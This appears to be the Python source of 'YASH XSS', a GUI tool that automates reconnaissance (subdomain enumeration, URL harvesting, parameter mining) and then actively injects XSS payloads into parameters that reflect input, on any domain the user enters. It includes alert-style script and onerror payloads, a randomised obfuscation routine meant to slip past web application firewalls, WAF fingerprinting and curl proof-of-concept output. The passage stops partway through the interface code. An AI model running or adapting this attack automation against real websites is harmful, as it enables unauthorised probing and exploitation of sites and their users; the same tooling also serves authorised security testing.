#!/usr/bin/env python3
"""
YASH XSS — Neural-Driven XSS Framework
All-in-One GUI Application. Run: python yash_xss_gui.py
"""

# ── Standard Library ─────────────────────────────────────────────────────────
import os
import sys
import subprocess
import threading
import random
import string
import re
import json
import html
import urllib.parse
import shutil
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Set, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass
from enum import Enum
from tkinter import filedialog, messagebox

# ── GUI ───────────────────────────────────────────────────────────────────────
import customtkinter as ctk

# ── HTTP ──────────────────────────────────────────────────────────────────────
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)

# ── Payload Library ───────────────────────────────────────────────────────────
try:
    from payloads import CONTEXT_PAYLOAD_MAP, GENERIC_PAYLOADS as _GENERIC_PAYLOADS
except ImportError:
    print("[!] payloads.py not found — using built-in fallback payloads.")
    CONTEXT_PAYLOAD_MAP  = {}
    _GENERIC_PAYLOADS    = ['<script>alert(1)</script>', '><img src=x onerror=alert(1)>']

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

VERSION = "3.0.0"

# ═════════════════════════════════════════════════════════════════════════════
#  DATA CLASSES
# ═════════════════════════════════════════════════════════════════════════════

class ReflectionContext(Enum):
    HTML_BODY             = "html_body"
    HTML_ATTRIBUTE_QUOTED = "html_attribute_quoted"
    JAVASCRIPT_STRING     = "javascript_string"
    JAVASCRIPT_VAR        = "javascript_var"
    NO_REFLECTION         = "no_reflection"

class WAFType(Enum):
    CLOUDFLARE  = "Cloudflare"
    AKAMAI      = "Akamai"
    AWS_WAF     = "AWS WAF"
    AZURE_WAF   = "Azure WAF"
    IMPERVA     = "Imperva/Incapsula"
    SUCURI      = "Sucuri"
    MODSECURITY = "ModSecurity"
    F5_BIG_IP   = "F5 BIG-IP"
    WORDFENCE   = "Wordfence"
    NONE        = "No WAF Detected"
    UNKNOWN     = "Unknown"

class InjectionResult(Enum):
    EXECUTED = "executed"
    BLOCKED  = "blocked"
    FILTERED = "filtered"
    ERROR    = "error"

@dataclass
class ReflectionResult:
    url: str
    parameter: str
    reflects: bool
    context: ReflectionContext
    reflection_count: int
    filtered_chars: List[str]
    confidence: float

@dataclass
class WAFResult:
    detected: bool
    waf_type: WAFType
    confidence: float
    bypass_recommendations: List[str]

@dataclass
class XSSTestResult:
    url: str
    parameter: str
    payload: str
    result: InjectionResult
    response_code: int
    reflected: bool
    bypass_used: Optional[str]
    evidence: str
    severity: str
    confidence: float
    poc_curl: str = ""

# ═════════════════════════════════════════════════════════════════════════════
#  SCANNER ENGINE CLASSES
# ═════════════════════════════════════════════════════════════════════════════

class PolymorphicEngine:
    @staticmethod
    def obfuscate(payload: str) -> str:
        payload = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        to_hex = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;'}
        if random.random() > 0.7:
            for char, hv in to_hex.items():
                payload = payload.replace(char, hv)
        if random.random() > 0.8:
            payload = payload.replace('<', '<%00')
        return payload


class ReflectionTester:
    XSS_CHARS = ['<', '>', '"', "'", '/', '\\', '(', ')', ';', '=', '`']

    def __init__(self, timeout=10, verify_ssl=True):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update(
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    def test_reflection(self, url: str, parameter: str) -> ReflectionResult:
        canary = "xss" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[parameter] = [canary]
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), parsed.fragment))
        try:
            resp = self.session.get(test_url, timeout=self.timeout,
                                    verify=self.verify_ssl, allow_redirects=True)
            if canary not in resp.text:
                return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)
            context  = self._detect_context(resp.text, canary)
            filtered = self._test_filtering(url, parameter)
            confidence = self._calc_confidence(context, filtered)
            return ReflectionResult(url, parameter, True, context,
                                    resp.text.count(canary), filtered, confidence)
        except:
            return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)

    def _detect_context(self, body, canary):
        idx = body.find(canary)
        ctx = body[max(0, idx - 500):min(len(body), idx + len(canary) + 500)]
        if re.search(r'<script[^>]*>.*?' + re.escape(canary), ctx, re.I | re.S):
            return (ReflectionContext.JAVASCRIPT_STRING
                    if re.search(r'["\'].*?' + re.escape(canary), ctx)
                    else ReflectionContext.JAVASCRIPT_VAR)
        if re.search(r'<\w+[^>]+\w+\s*=\s*(["\']?)[^>]*?' + re.escape(canary), ctx, re.I):
            return ReflectionContext.HTML_ATTRIBUTE_QUOTED
        return ReflectionContext.HTML_BODY

    def _test_filtering(self, url, parameter):
        filtered = []
        for char in self.XSS_CHARS:
            canary = "x" + "".join(random.choices(string.ascii_lowercase, k=4))
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [f"{canary}{char}{canary}"]
            try:
                r = self.session.get(
                    urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(params, doseq=True), parsed.fragment)),
                    timeout=5, verify=self.verify_ssl)
                if f"{canary}{char}{canary}" not in r.text:
                    filtered.append(char)
            except:
                pass
        return filtered

    def _calc_confidence(self, context, filtered):
        score = 0.9 if context == ReflectionContext.HTML_BODY else 0.7
        score -= len([c for c in filtered if c in ['<', '>', '"', "'"]]) * 0.15
        return max(0.0, score)


class WAFDetector:
    SIGNATURES = {
        WAFType.CLOUDFLARE:  {'h': ['cf-ray', '__cfduid'],           's': ['cloudflare'],  'b': ['cloudflare', 'attention required']},
        WAFType.AKAMAI:      {'h': ['x-akamai-request-id'],          's': ['akamai']},
        WAFType.AWS_WAF:     {'h': ['x-amzn-requestid'],             'b': ['request blocked']},
        WAFType.IMPERVA:     {'h': ['x-iinfo', 'incap_ses'],         's': ['incapsula', 'imperva']},
        WAFType.MODSECURITY: {'b': ['modsecurity', 'mod_security']},
        WAFType.SUCURI:      {'h': ['x-sucuri-id'],                  's': ['sucuri']},
        WAFType.WORDFENCE:   {'b': ['wordfence']},
        WAFType.F5_BIG_IP:   {'h': ['x-wa-info'],                    's': ['big-ip', 'f5']},
    }



    # ── Payloads loaded from payloads.py — edit that file to add more ────────
    CONTEXT_PAYLOADS = {
        ReflectionContext.HTML_BODY:             CONTEXT_PAYLOAD_MAP.get("html_body",             ['<script>alert(1)</script>']),
        ReflectionContext.HTML_ATTRIBUTE_QUOTED: CONTEXT_PAYLOAD_MAP.get("html_attribute_quoted", ['"><img src=x onerror=alert(1)>']),
        ReflectionContext.JAVASCRIPT_STRING:     CONTEXT_PAYLOAD_MAP.get("javascript_string",     ["';alert(1)//"]),
        ReflectionContext.JAVASCRIPT_VAR:        CONTEXT_PAYLOAD_MAP.get("javascript_var",        [';alert(1)//']),
    }

    GENERIC_PAYLOADS = _GENERIC_PAYLOADS

    def __init__(self, timeout=10, verify_ssl=True):
        self.timeout  = timeout
        self.verify_ssl = verify_ssl
        self.session  = requests.Session()
        self.session.headers.update(
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

    def detect(self, url: str) -> WAFResult:
        try:
            s  = requests.Session()
            r1 = s.get(url, timeout=10, verify=self.verify_ssl)
            r2 = s.get(f"{url}?t=<script>alert(1)</script>'", timeout=10, verify=self.verify_ssl)
            headers = {**r1.headers, **r2.headers}
            for wtype, sigs in self.SIGNATURES.items():
                if (any(h.lower() in str(headers).lower() for h in sigs.get('h', [])) or
                        any(sv.lower() in headers.get('Server', '').lower() for sv in sigs.get('s', [])) or
                        any(b.lower() in r2.text.lower() for b in sigs.get('b', []))):
                    return WAFResult(True, wtype, 0.9, ["Use encoding", "Try SVG", "Case variation"])
            return WAFResult(False, WAFType.NONE, 1.0, [])
        except:
            return WAFResult(False, WAFType.UNKNOWN, 0.0, [])

    def test_xss(self, url: str, parameter: str,
                 context: ReflectionContext = ReflectionContext.HTML_BODY,
                 custom_payloads: List[str] = None, url_encode: bool = False) -> List[XSSTestResult]:
        results = []
        canary    = "xss" + "".join(random.choices(string.ascii_lowercase, k=6))
        req_chars = ['<', '>'] if context == ReflectionContext.HTML_BODY else ['"', "'"]
        test_str  = canary + "".join(req_chars)

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[parameter] = [test_str]
        verify_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, urlencode(params, doseq=True), parsed.fragment))
        try:
            v = self.session.get(verify_url, timeout=self.timeout, verify=self.verify_ssl)
            if test_str not in v.text:
                return []
        except:
            return []

        if custom_payloads:
            payloads = custom_payloads
        else:
            payloads = self.CONTEXT_PAYLOADS.get(context, self.GENERIC_PAYLOADS)
            if payloads is not self.GENERIC_PAYLOADS:
                payloads = payloads + [p for p in self.GENERIC_PAYLOADS if p not in payloads]

        for payload in payloads:
            if url_encode:
                payload = urllib.parse.quote(payload)
            elif not custom_payloads and random.random() > 0.4:
                payload = PolymorphicEngine.obfuscate(payload)
            params[parameter] = [payload]
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), parsed.fragment))
            try:
                resp = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                if (payload in resp.text or urllib.parse.unquote(payload) in resp.text) \
                        and resp.status_code not in [403, 406]:
                    poc = f"curl -i -s -k '{test_url}'"
                    results.append(XSSTestResult(
                        url=test_url, parameter=parameter, payload=payload,
                        result=InjectionResult.EXECUTED, response_code=resp.status_code,
                        reflected=True, bypass_used=None,
                        evidence=f"Confirmed execution in {context.value}",
                        severity="CRITICAL", confidence=1.0, poc_curl=poc))
                    break
            except:
                pass
        return results


# ═════════════════════════════════════════════════════════════════════════════
#  XSS ENGINE  (runs entirely in a background thread)
# ═════════════════════════════════════════════════════════════════════════════

class XSSEngine:
    def __init__(self, domain, threads, proxy, payloads_file, urls_file,
                 export_json, profile, verify_ssl, gui_log, stop_event,
                 url_encode=False, raw_url=None):
        self.domain          = domain
        self.raw_url         = raw_url
        self.threads         = threads
        self.proxy           = proxy or None
        self.payloads_file   = payloads_file or None
        self.urls_file       = urls_file or None
        self.export_json     = export_json
        self.profile         = profile
        self.verify_ssl      = verify_ssl
        self.gui_log         = gui_log
        self.stop_event      = stop_event
        self.url_encode      = url_encode

        self.output_dir = Path(f"output/{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.report_file = self.output_dir / "report.html"
        self.json_file   = self.output_dir / "results.json"

        self.subdomains  : Set[str]               = {self.domain}
        self.live_hosts  : Set[str]               = set()
        self.urls        : Set[str]               = set()
        self.reflections : List[ReflectionResult] = []
        self.exploits    : List[dict]             = []
        self.waf_info    : WAFResult              = WAFResult(False, WAFType.NONE, 0.0, [])
        self.start_time  = datetime.now()
        self.custom_payloads : List[str] = []

    # ── helpers ───────────────────────────────────────────────────────────────

    def log(self, msg: str):
        self.gui_log(msg + "\n")

    def _tool_available(self, name: str) -> bool:
        if shutil.which(name): return True
        if os.path.exists(name + ".exe"): return True
        return False

    def _run_live(self, cmd: List[str], max_log: int = 200) -> List[str]:
        executable = cmd[0]
        is_gau = "gau" in executable
        if not shutil.which(executable) and os.path.exists(executable + ".exe"):
            cmd[0] = os.path.join(os.getcwd(), executable + ".exe")
        results = []
        try:
            stderr_dest = subprocess.DEVNULL if is_gau else subprocess.STDOUT
            cflags = getattr(subprocess, 'CREATE_NO_WINDOW', 0x08000000)
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=stderr_dest, text=True, bufsize=1, encoding='utf-8', errors='replace',
                                    creationflags=cflags)
            for line in proc.stdout:
                line = line.strip()
                if line:
                    if is_gau and ("level=" in line or "msg=" in line or "time=" in line):
                        continue
                    results.append(line)
                    if len(results) <= max_log:
                        self.log(f"  ↳ {line}")
                    elif len(results) == max_log + 1:
                        self.log(f"  ↳ [... Output truncated for UI performance. Background processes still mining ...]")
                if self.stop_event.is_set():
                    proc.terminate()
                    break
            proc.wait(timeout=5)
        except Exception as e:
            self.log(f"[-] Tool error: {e}")
        return results

    def _run_cmd(self, cmd: List[str]) -> str:
        executable = cmd[0]
        if not shutil.which(executable) and os.path.exists(executable + ".exe"):
            cmd[0] = os.path.join(os.getcwd(), executable + ".exe")
        try:
            cflags = getattr(subprocess, 'CREATE_NO_WINDOW', 0x08000000)
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=120, encoding='utf-8', errors='replace', creationflags=cflags)
            return r.stdout
        except:
            return ""

    # ── loading ───────────────────────────────────────────────────────────────

    def load_urls_file(self):
        try:
            with open(self.urls_file, 'r', encoding='utf-8', errors='replace') as f:
                urls = [l.strip() for l in f if l.strip() and '?' in l]
            self.urls.update(urls)
            self.log(f"[+] Loaded {len(urls)} URLs from {Path(self.urls_file).name}")
        except Exception as e:
            self.log(f"[-] URL file error: {e}")

    def load_payloads_file(self):
        try:
            with open(self.payloads_file, 'r', encoding='utf-8', errors='replace') as f:
                self.custom_payloads = [l.strip() for l in f if l.strip()]
            self.log(f"[+] Loaded {len(self.custom_payloads)} custom payloads")
        except Exception as e:
            self.log(f"[-] Payload file error: {e}")

    # ── phases ────────────────────────────────────────────────────────────────

    def check_tools(self):
        tools = ["subfinder", "httpx", "gau", "paramspider"]
        self.log("[*] System diagnostics:")
        for t in tools:
            status = "✔" if self._tool_available(t) else "✖ MISSING"
            self.log(f"    {status}  {t}")

    def run_subfinder(self):
        if not self._tool_available("subfinder"):
            self.log("[!] subfinder not found — using Neural Fallback (crt.sh)...")
            try:
                proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
                req = requests.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=15, proxies=proxies, verify=self.verify_ssl)
                if req.status_code == 200:
                    for entry in req.json():
                        name = entry.get("name_value", "")
                        if "*" not in name:
                            self.subdomains.add(name.strip().split('\n')[0])
            except Exception as e:
                self.log(f"[-] crt.sh fallback failed: {e}")
            for s in list(self.subdomains)[:100]:
                self.log(f"  ↳ {s}")
            self.log(f"[+] Found {len(self.subdomains)} subdomains via fallback")
            return
        self.log("[*] Phase 1 — Subdomain Discovery (subfinder)...")
        self.log("  ↳ Querying passive DNS archives and neural data-leaks...")
        self.log("  ↳ Parsing root-zone infrastructure for horizontal expansion...")
        results = self._run_live(["subfinder", "-d", self.domain, "-silent"])
        self.subdomains.update(results)
        self.log(f"[+] Found {len(self.subdomains)} subdomains")

    def run_httpx(self):
        if not self._tool_available("httpx"):
            self.log("[!] httpx not found — using Neural Fallback (Requests)...")
            proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
            for sub in list(self.subdomains):
                if self.stop_event.is_set(): break
                for proto in ["https", "http"]:
                    url = f"{proto}://{sub}"
                    try:
                        requests.get(url, timeout=4, proxies=proxies, verify=False)
                        self.live_hosts.add(url)
                        self.log(f"  ↳ {url}")
                        break
                    except:
                        pass
            if not self.live_hosts:
                self.live_hosts.add(f"https://{self.domain}")
                self.live_hosts.add(f"http://{self.domain}")
            self.log(f"[+] Found {len(self.live_hosts)} live hosts via fallback")
            return
        self.log("[*] Phase 2 — Live Host Probing (httpx)...")
        self.log(f"  ↳ Probing {len(self.subdomains)} global assets for protocol handshakes...")
        self.log("  ↳ Analyzing server fingerprints and SSL/TLS certificates...")
        subs_file = self.output_dir / "subdomains.txt"
        subs_file.write_text("\n".join(self.subdomains), encoding='utf-8', errors='replace')
        results = self._run_live(["httpx", "-l", str(subs_file), "-silent"])
        self.live_hosts.update(results)
        self.log(f"[+] {len(self.live_hosts)} assets responding to neural ping")

    def run_gau(self):
        if not self._tool_available("gau"):
            self.log("[!] gau not found — using Neural Fallback (Common Endpoints)...")
            endpoints = ["/index.php?id=1", "/search?q=test", "/view?page=1", "/login?next=/home"]
            new_urls = []
            for h in self.live_hosts:
                for ep in endpoints:
                    new_urls.append(f"{h}{ep}")
            self.urls.update(new_urls)
            self.log(f"[+] Queued {len(new_urls)} simulated URLs via fallback")
            return
        self.log("[*] Phase 3 — URL Harvesting (gau)...")
        self.log("  ↳ Mining historical URL fragments from Wayback and OTX neural archives...")
        self.log("  ↳ Deduplicating archaic parameters for high-entropy vectors...")
        results = self._run_live(["gau", "--subs", self.domain])
        urls = [u for u in results if '?' in u]
        self.urls.update(urls)
        self.log(f"[+] Harvested {len(urls)} URLs")

    def run_paramspider(self):
        if not self._tool_available("paramspider"):
            self.log("[!] paramspider not found — skipping")
            return
        self.log("[*] Phase 4 — Parameter Mining (paramspider)...")
        self.log("  ↳ Crawling target surface and parsing DOM fragments for injection points...")
        self.log("  ↳ Identifying vulnerable JavaScript sources and sinks...")
        out_file = self.output_dir / "paramspider.txt"
        self._run_cmd(["paramspider", "-d", self.domain, "-o", str(out_file)])
        if out_file.exists():
            urls = [l.strip() for l in out_file.read_text(encoding='utf-8', errors='replace').splitlines() if '?' in l]
            self.urls.update(urls)
            self.log(f"[+] Found {len(urls)} spider URLs")
        else:
            self.log("[!] ParamSpider produced no output")

    def run_analysis(self):
        self.log(f"[*] Phase 6 — Reflection & WAF Analysis on {len(self.urls)} URLs...")
        self.log("  ↳ Analyzing candidates for heuristic reflection patterns...")
        self.log("  ↳ Fingerprinting WAF signatures and rate-limit thresholds...")
        self.log("  ↳ Identifying execution contexts (HTML, attribute, JS, CSS)...")
        
        # In case the user provided an exact URL with parameters
        if self.raw_url and ("?" in self.raw_url and "=" in self.raw_url):
            self.urls.add(self.raw_url)
            self.log(f"[+] Injecting user-provided direct URL: {self.raw_url}")
            
        # Fallback if nothing else yielded parameterized endpoints
        if not self.urls and self.live_hosts:
            fallback = list(self.live_hosts)[0].rstrip('/') + "/?param_hunter=yash"
            self.urls.add(fallback)
            self.log(f"[!] No parameters discovered naturally. Injecting structural fallback: {fallback}")
            
        if not self.urls:
            self.log("[!] No URLs to analyse")
            return

        target = (list(self.live_hosts)[0] if self.live_hosts else f"https://{self.domain}")
        self.log(f"[*] Detecting WAF on {target}...")
        detector = WAFDetector(verify_ssl=self.verify_ssl)
        self.waf_info = detector.detect(target)
        if self.waf_info.detected:
            self.log(f"[!] WAF DETECTED: {self.waf_info.waf_type.value} [SHIELD ACTIVE]")
        else:
            self.log("[+] No WAF detected")

        tester   = ReflectionTester(verify_ssl=self.verify_ssl)
        url_list = list(self.urls)[:200]
        for i, url in enumerate(url_list):
            if self.stop_event.is_set():
                break
            try:
                params = parse_qs(urlparse(url).query)
                for p in params:
                    res = tester.test_reflection(url, p)
                    if res.reflects:
                        self.reflections.append(res)
            except:
                pass
            if i % 10 == 0:
                self.log(f"  [~] Reflection scan {i}/{len(url_list)} — hits: {len(self.reflections)}")
        self.log(f"[+] Reflection analysis done — {len(self.reflections)} reflective params")

    def run_exploitation(self):
        if not self.reflections:
            self.log("[!] No reflection points — skipping exploitation")
            return
        self.log(f"[*] Phase 7 — Active XSS Exploitation ({len(self.reflections)} targets)...")
        self.log(f"  ↳ Infiltrating {len(self.reflections)} prone reflection patterns...")
        self.log("  ↳ Deploying polymorphic context-aware payloads with WAF-evasion...")
        self.log("  ↳ Triggering neural handshakes and parsing response JS integrity...")
        
        tester = WAFDetector(verify_ssl=self.verify_ssl)
        for i, r in enumerate(self.reflections):
            if self.stop_event.is_set():
                break
            self.log(f"  [~] Assaulting data-vector: '{r.parameter}' ({i+1}/{len(self.reflections)})")
            results = tester.test_xss(r.url, r.parameter, r.context, custom_payloads=self.custom_payloads, url_encode=self.url_encode)
            for res in results:
                exploit = {
                    'url': res.url, 'param': res.parameter, 'payload': res.payload,
                    'evidence': res.evidence, 'severity': res.severity, 'poc': res.poc_curl
                }
                self.exploits.append(exploit)
                self.log(f"  [!!] VULNERABILITY CONFIRMED — param: {res.parameter}")
                self.log(f"       Payload: {res.payload[:80]}")
        self.log(f"[+] Exploitation done — {len(self.exploits)} vulnerabilities confirmed")

    def generate_report(self):
        vuln_html = ""
        for e in self.exploits:
            vuln_html += f"""
            <div class="vuln-card">
              <div class="vuln-header"><span class="param">{html.escape(e['param'])}</span>
                <span class="badge">CRITICAL</span></div>
              <p><b>URL:</b> <code>{html.escape(e['url'])}</code></p>
              <p><b>Payload:</b> <code>{html.escape(e['payload'])}</code></p>
              <p><b>POC:</b> <code>{html.escape(e['poc'])}</code></p>
              <p><b>Evidence:</b> {html.escape(e['evidence'])}</p>
            </div>"""

        waf_text = self.waf_info.waf_type.value if self.waf_info.detected else "None detected"
        now      = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        duration = str(datetime.now() - self.start_time).split('.')[0]

        report = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>YASH XSS Report | {html.escape(self.domain)}</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
  <style>
    :root{{--blue:#00d9ff;--red:#ff0055;--green:#00ff88;--bg:#0a0a0f;--card:rgba(20,20,30,.85)}}
    *{{box-sizing:border-box;margin:0;padding:0}}
    body{{background:var(--bg);color:#e0e0e0;font-family:'Roboto Mono',monospace;
          background-image:linear-gradient(rgba(0,217,255,.04)1px,transparent 1px),
          linear-gradient(90deg,rgba(0,217,255,.04)1px,transparent 1px);
          background-size:30px 30px;padding:30px}}
    .wrap{{max-width:1100px;margin:0 auto}}
    h1{{font-family:'Orbitron',sans-serif;font-size:2.2rem;color:var(--blue);
        text-shadow:2px 2px var(--red),-2px -2px var(--green);margin-bottom:8px}}
    .subtitle{{color:#666;margin-bottom:30px}}
    .stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:30px}}
    .stat{{background:var(--card);border:1px solid var(--blue);border-radius:10px;
           padding:20px;text-align:center;transition:.3s}}
    .stat:hover{{transform:translateY(-4px);box-shadow:0 0 18px var(--blue)}}
    .stat-val{{font-size:2rem;font-weight:bold;color:var(--blue)}}
    .stat-lbl{{font-size:.75rem;color:#555;margin-top:4px}}
    h2{{font-family:'Orbitron',sans-serif;color:var(--red);margin:24px 0 12px}}
    .vuln-card{{background:rgba(255,0,85,.06);border-left:4px solid var(--red);
                border-radius:0 8px 8px 0;padding:18px;margin-bottom:16px}}
    .vuln-header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}}
    .param{{font-size:1.1rem;font-weight:bold;color:#fff}}
    .badge{{background:var(--red);color:#fff;padding:4px 12px;border-radius:20px;font-size:.75rem}}
    code{{background:#000;padding:3px 7px;border-radius:4px;color:var(--green);word-break:break-all}}
    p{{margin:6px 0;font-size:.85rem}}
    .safe{{color:var(--green);font-size:1.1rem;padding:20px;text-align:center}}
    footer{{text-align:center;margin-top:40px;color:#444;font-size:.75rem}}
  </style>
</head>
<body><div class="wrap">
  <h1>YASH_XSS_INTEL</h1>
  <p class="subtitle">Target: {html.escape(self.domain)} | Generated: {now} | Duration: {duration}</p>
  <div class="stats">
    <div class="stat"><div class="stat-val">{len(self.subdomains)}</div><div class="stat-lbl">SUBDOMAINS</div></div>
    <div class="stat"><div class="stat-val">{len(self.live_hosts)}</div><div class="stat-lbl">LIVE HOSTS</div></div>
    <div class="stat"><div class="stat-val">{len(self.urls)}</div><div class="stat-lbl">URLS</div></div>
    <div class="stat"><div class="stat-val">{len(self.reflections)}</div><div class="stat-lbl">REFLECTIONS</div></div>
    <div class="stat"><div class="stat-val" style="color:var(--red)">{len(self.exploits)}</div><div class="stat-lbl">VULNS</div></div>
    <div class="stat"><div class="stat-val" style="font-size:1rem">{html.escape(waf_text)}</div><div class="stat-lbl">WAF</div></div>
  </div>
  <h2>☣ VULNERABILITY MATRIX</h2>
  {vuln_html if vuln_html else '<p class="safe">✔ No vulnerabilities confirmed.</p>'}
  <footer>YASH XSS v{VERSION} | {now}</footer>
</div></body></html>"""

        self.report_file.write_text(report, encoding='utf-8')
        self.log(f"[+] HTML report saved: {self.report_file}")

    def export_to_json(self):
        data = {
            "domain": self.domain, "scan_time": self.start_time.isoformat(),
            "duration": str(datetime.now() - self.start_time),
            "stats": {"subdomains": len(self.subdomains), "live_hosts": len(self.live_hosts),
                      "urls": len(self.urls), "reflections": len(self.reflections),
                      "exploits": len(self.exploits)},
            "waf_detected": self.waf_info.detected,
            "waf_type": self.waf_info.waf_type.value,
            "vulnerabilities": self.exploits,
        }
        self.json_file.write_text(json.dumps(data, indent=2), encoding='utf-8')
        self.log(f"[+] JSON exported: {self.json_file}")

    # ── full automated run ───────────────────────────────────────────────────

    def run_full(self):
        # Load supplementary files
        if self.payloads_file:
            self.load_payloads_file()
        if self.urls_file:
            self.load_urls_file()

        self.check_tools()

        # Skip recon phases if URLs were manually loaded
        if not self.urls_file:
            if not self.stop_event.is_set():
                self.run_subfinder()
            if not self.stop_event.is_set():
                self.run_httpx()
            if not self.stop_event.is_set():
                self.run_gau()
            if self.profile in ("Neural", "Deep") and not self.stop_event.is_set():
                self.run_paramspider()
        else:
            # Seed live hosts from domain when using URL list
            self.live_hosts.add(f"https://{self.domain}")
            self.live_hosts.add(f"http://{self.domain}")

        if not self.stop_event.is_set():
            recon_file = self.output_dir / f"{self.domain}_recon.txt"
            with open(recon_file, "w") as rf:
                rf.write("--- YASH XSS Recon Report ---\n--- Subdomains ---\n")
                rf.write("\n".join(self.subdomains) + "\n\n--- Live Hosts ---\n")
                rf.write("\n".join(self.live_hosts) + "\n")
            self.log(f"[+] Recon data saved to {recon_file.name}")

        if not self.stop_event.is_set():
            self.run_analysis()
        if not self.stop_event.is_set():
            self.run_exploitation()

        if not self.stop_event.is_set():
            self.generate_report()
            if self.export_json:
                self.export_to_json()


# ═════════════════════════════════════════════════════════════════════════════
#  GUI  APPLICATION
# ═════════════════════════════════════════════════════════════════════════════

class YASHXssGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(f"⚡ YASH XSS v{VERSION} — Neural-Driven Framework")
        self.geometry("1180x750")
        self.minsize(720, 500)
        self.configure(fg_color="#0d0d14")

        self.engine        = None
        self.scan_thread   = None
        self.is_scanning   = False
        self.stop_event    = threading.Event()
        self.input_list_path   = ""
        self.payloads_file_path = ""
        self.api_key_val   = ""
        self.ignore_tls_var = ctk.BooleanVar(value=False)
        self.urlencode_var = ctk.BooleanVar(value=False)

        self._build_ui()
        self._log_raw(self._banner_text())
        self._log("[+] YASH XSS GUI ready. Configure target and press START SCAN.\n", "#00ff88")

    # ── banner ────────────────────────────────────────────────────────────────

    def _banner_text(self):
        return (
            "██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
            "╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
            " ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║\n"
            " ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║\n"
            "██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║\n"
            "╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
            f"        Neural-Driven XSS Recon & Exploitation Framework  v{VERSION}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        )

    # ── build UI ──────────────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Sidebar ───────────────────────────────────────────────────────────
        self.sidebar = ctk.CTkScrollableFrame(self, width=310, corner_radius=0, fg_color="#0a0a12")
        self.sidebar.pack(side="left", fill="y", expand=False)

        ctk.CTkLabel(self.sidebar, text="⚡ YASH XSS",
                     font=ctk.CTkFont("Consolas", 20, "bold"),
                     text_color="#00d9ff").pack(pady=(18, 2))
        self._sep()

        self._label("🎯  Target Domain")
        self.domain_entry = self._entry("e.g. testphp.vulnweb.com", border="#00d9ff")

        self._label("🔒  Proxy  (optional)")
        self.proxy_entry = self._entry("http://127.0.0.1:8080")
        self._sep()

        self.threads_lbl = ctk.CTkLabel(self.sidebar, text="⚙️  Threads: 5",
                                        font=ctk.CTkFont("Consolas", 12), text_color="#aaaacc")
        self.threads_lbl.pack(anchor="w", padx=16, pady=(6, 0))
        self.threads_slider = ctk.CTkSlider(
            self.sidebar, from_=1, to=50, number_of_steps=49,
            button_color="#00d9ff", progress_color="#005577",
            command=lambda v: self.threads_lbl.configure(text=f"⚙️  Threads: {int(v)}"))
        self.threads_slider.set(5)
        self.threads_slider.pack(fill="x", padx=16, pady=(2, 10))
        self._sep()

        self._label("⚡ Scan Profile")
        self.scan_profile = ctk.CTkOptionMenu(
            self.sidebar, values=["Standard", "Neural", "Deep"],
            fg_color="#003344", button_color="#005577", button_hover_color="#00d9ff",
            dropdown_fg_color="#0a0a12", dropdown_hover_color="#111122")
        self.scan_profile.pack(fill="x", padx=16, pady=(2, 10))

        self.chk_json = ctk.CTkCheckBox(self.sidebar, text="Export JSON",
                                         text_color="#aaaacc", fg_color="#00d9ff",
                                         hover_color="#005577", checkmark_color="#000")
        self.chk_json.pack(anchor="w", padx=20, pady=3)

        self.chk_tls = ctk.CTkCheckBox(self.sidebar, text="Ignore TLS Errors",
                                        text_color="#aaaacc", fg_color="#ff0044",
                                        hover_color="#cc0033", checkmark_color="#fff",
